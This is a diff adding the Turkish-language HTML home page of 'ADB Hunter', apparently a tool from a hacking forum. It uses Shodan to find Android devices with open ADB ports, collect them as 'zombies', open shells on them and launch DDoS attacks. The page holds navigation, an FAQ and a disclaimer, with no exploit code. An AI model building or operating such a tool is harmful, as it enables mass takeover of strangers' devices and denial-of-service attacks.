@@ -1,0 +1,103 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <link rel="icon" type="image/svg" href="{{url_for('static', filename='images/logo.svg')}}">
+    <title>ADB Hunter</title>
+
+    <script src="{{url_for('static', filename='jquery.js')}}"></script>
+    <script src="{{url_for('static', filename='popper.min.js')}}"></script>
+    <script src="{{url_for('static', filename='bootstrap.min.js')}}"></script>
+    <link rel="stylesheet" href="{{url_for('static', filename='bootstrap.min.css')}}">
+    <link rel="stylesheet" href="{{url_for('static', filename='style.css')}}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+
+<body>
+    <!-----Navbar------>
+    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">
+        <a class="navbar-brand" href="/"><img class="logo" src="{{url_for('static', filename='images/logo.svg')}}"></a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#nav_bar" aria-controls="nav_bar" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div class="collapse navbar-collapse" id="nav_bar">
+            <ul class="navbar-nav mr-auto">
+                <li class="nav-item active">
+                    <a class="nav-link" href="/"><i class="fa fa-home" aria-hidden="true"></i>&nbsp;&nbsp;Anasayfa<span class="sr-only">(current)</span></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="/shodan"><i class="fa fa-sliders" aria-hidden="true"></i>&nbsp;&nbsp;Shodan Ayarları</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="/zombies"><i class="fa fa-users" aria-hidden="true"></i>&nbsp;&nbsp;Zombileri Bul</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="/shell"><i class="fa fa-terminal" aria-hidden="true"></i>&nbsp;&nbsp;Shell Aç</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="/ddos"><i class="fa fa-bullseye" aria-hidden="true"></i>&nbsp;&nbsp;Saldır</a>
+                </li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="container">
+        <blockquote class="blockquote text-center">
+            <img style="width: 150px; padding-bottom: 30px" src="{{url_for('static', filename='images/thtlogo.png')}}">
+            <h3 class="text-danger" style="padding-bottom: 2%">Kullanmadan Önce Okuyunuz!</h3>
+            <p class="mb-2">Bu program Turk Hack Team forumu için yazılmıştır. Bu programı Türk makinelerinde kullanmayın!
+                <br>Eylemlerinin sonuçları kullanıcının sorumluluğundadır forum veya yapımcı herhangi bir sorumluluk kabul etmez.</p>
+            <footer class="blockquote-footer">Yapımcı <cite title="Source Title">Hichigo (Ar-Ge Tim)</cite></footer>
+        </blockquote>
+    </div>
+    <hr>
+    <div class="container">
+        <h3 class="text-center text-danger"><i class="fa fa-question-circle-o" aria-hidden="true"></i>&nbsp;&nbsp;Sıkça Sorulan Sorular</h3>
+        <p class="blockquote text-danger text-left" style="margin-top: 5%">
+            <i class="fa fa-question-circle" aria-hidden="true"></i>&nbsp;&nbsp;Bu program ne işe yarıyor?
+            <br>
+        </p>
+        <p class="text-left blockquote" style="margin-top: 0px !important">
+            Bu programı kullanarak internetteki açığı bulunan Android cihazlarını bulabilir veya kendiniz manuel olarak ekleyebilir ve istismar edebilirsiniz.
+            <br>
+        </p>
+        <p class="blockquote text-danger text-left" style="margin-top: 2%">
+            <i class="fa fa-question-circle" aria-hidden="true"></i>&nbsp;&nbsp;Bu program nasıl çalışıyor?
+        </p>
+        <p class="text-left blockquote" style="margin-top: 0px !important">
+            Bu program Shodan arama motorunu kullanarak ADB servisi açık Android cihazlarını buluyor ardından ise istismar işlemini başlatıyor.
+        </p>
+        <p class="blockquote text-danger text-left" style="margin-top: 2%">
+            <i class="fa fa-question-circle" aria-hidden="true"></i>&nbsp;&nbsp;Program hata veriyor, ne yapabilirim ?
+        </p>
+        <p class="text-left blockquote" style="margin-top: 0px !important">
+            Programın daha ilk sürümleri olduğundan hata vermesi oldukça normal. Sonraki sürümlerde hataları düzeltmeye çalışacağım.
+        </p>
+    </div>
+    <hr>
+    <div class="container" style="padding-bottom: 5%">
+        <h3 class="text-center text-danger"><i class="fa fa-bandcamp" aria-hidden="true"></i>&nbsp;&nbsp;İletişim</h3>
+        <div class="container-fluid" style="width: 100%; padding-top: 5%">
+            <div class="row">
+                <div class="col-xs-12 col-md-6">
+                    <div class="navy">
+                        <div class="content text-center">
+                            <a href="https://www.instagram.com/hichigo.exe/"><h4 class="text-danger"><i class="fa fa-instagram" aria-hidden="true"></i>&nbsp;&nbsp;@hichigo.exe</h4></a>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-xs-12 col-md-6">
+                    <div class="light">
+                        <div class="content text-center">
+                            <a href="https://t.me/HichigoTHT"><h4 class="text-danger"><i class="fa fa-telegram" aria-hidden="true"></i>&nbsp;&nbsp;@HichigoTHT</h4></a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div>
+</body>
+
+</html>
